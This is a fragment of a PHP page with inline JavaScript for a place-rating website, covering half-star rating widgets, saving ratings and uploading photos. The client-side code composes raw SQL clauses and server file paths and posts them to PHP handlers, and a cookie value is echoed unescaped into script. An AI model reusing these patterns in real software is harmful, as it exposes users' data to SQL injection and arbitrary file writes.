                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(5,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                case 6:
                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(6,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                case 7:
                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(7,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                case 8:
                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(8,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                case 9:
                    document.getElementById(`record-${arguments[1]}`).innerHTML=getScore(9,arguments[1],`${arguments[2]}`,`${arguments[3]}`,`${arguments[4]}`,arguments[5],arguments[6])
                    break
                default:
                    break
            }


            postJson.userId=<?php echo $_COOKIE['user_id']?>

                postJson.rating=parseInt(arguments[0])+1
            postJson.id=arguments[1]
            postJson.location=arguments[2]
            postJson.category=arguments[3]
            postJson.name=arguments[4]
            postJson.y=arguments[5]
            postJson.x=arguments[6]


            postJson={}
            postJson[0]=2
            postJson[1]='*'
            postJson[2]='record'
            postJson[3]=`userid=${<?php echo $_COOKIE['user_id']?>} and \`where\`=${arguments[1]}`
            let v=JSON.parse(await $.post("script/php/DAOHandler.php",postJson));

            if(v.length===0) {
                postJson={}
                postJson[0]=1
                postJson[1]='record(userid,rating,what,`where`,y,x,address,category)'
                postJson[2]=`${userId},${parseInt(arguments[0])+1},'${arguments[4]}',${arguments[1]},${arguments[5]},${arguments[6]},'${arguments[2]}','${arguments[3]}'`
                await $.post("script/php/DAOHandler.php",postJson)
            }
            else {
                postJson={}
                postJson[0]=3
                postJson[1]='record'
                postJson[2]=`rating=${parseInt(arguments[0])+1}`
                postJson[3]=`userid=${<?php echo $_COOKIE['user_id']?>} and \`where\`=${arguments[1]}`
                const v=await $.post("script/php/DAOHandler.php",postJson)
            }
        }

        function search() {

            // 키워드로 장소를 검색합니다
            cok.before=null
            const value=document.getElementById('where').value;
            resultDiv=[]
            document.getElementById('where').value=''
            ps.keywordSearch(value, placesSearchCB);

        }
        function getScore() {
            let width=parseInt(arguments[7])/2
            let height=parseInt(arguments[7])
            switch (parseInt(arguments[0])) {
                case -1:
                    return `
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 0:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 1:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 2:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 3:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 4:
                    return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 5: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 6: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 7: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 8: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                case 9: return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
                default:
                    break
            }
        }
        async function handleFiles(files) {
            let postJson={}
            const preview=document.getElementById("preview")

            let formData = new FormData();
            formData.append("userId", userId);
            formData.append("placeId", placeId);

            for (let i = 0; i < files.length; i++) {
                const file = files[i];
                if (!file.type.startsWith('image/')){ continue }
                const idx=(file.name).indexOf('.')
                const fileName=`${userId}-${placeId}.${(file.name).substring(idx+1)}`
                const filePath=`/var/www/html/config/recordImages/${fileName}`

                let postJson={}
                postJson[0]=2
                postJson[1]='*'
                postJson[2]='record'
                postJson[3]=`userid=${userId} and \`where\`=${placeId}`
                const v=JSON.parse(await $.post( "script/php/DAOHandler.php",postJson))

                if(v.length>0) {
                    let postJson={}
                    postJson[0]=3
                    postJson[1]='record'
                    postJson[2]=`image='http://ssossotable.com/config/recordImages/${fileName}'`
                    postJson[3]=`userid=${userId} and \`where\`=${placeId}`
                    await $.post( "script/php/DAOHandler.php",postJson)
                }
                else {
                    postJson={}
                    postJson[0]=1
                    postJson[1]="record(userid,`where`,image)"
                    postJson[2]=`${userId},${placeId},'http://ssossotable.com/config/recordImages/${fileName}'`
                    await $.post( "script/php/DAOHandler.php",postJson)
                }

                formData.append("filePath", filePath);
                formData.append("image", file);

                await $.ajax({
                    type:"POST",
                    url: "/script/php/FileHandler.php",
                    processData: false,
                    contentType: false,
                    data: formData
                })


                const img = document.createElement("img");
                img.classList.add("obj");
                img.file = file;

                img.width=60
                img.height=60

                preview.innerHTML=``
                preview.appendChild(img); // "preview"가 결과를 보여줄 div 출력이라 가정.

                const reader = new FileReader();
                reader.onload = (function(aImg) { return function(e) { aImg.src = e.target.result; }; })(img);
                reader.readAsDataURL(file);
            }
        }
    </script>
    <script>
        init()
    </script>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
</body>
</html>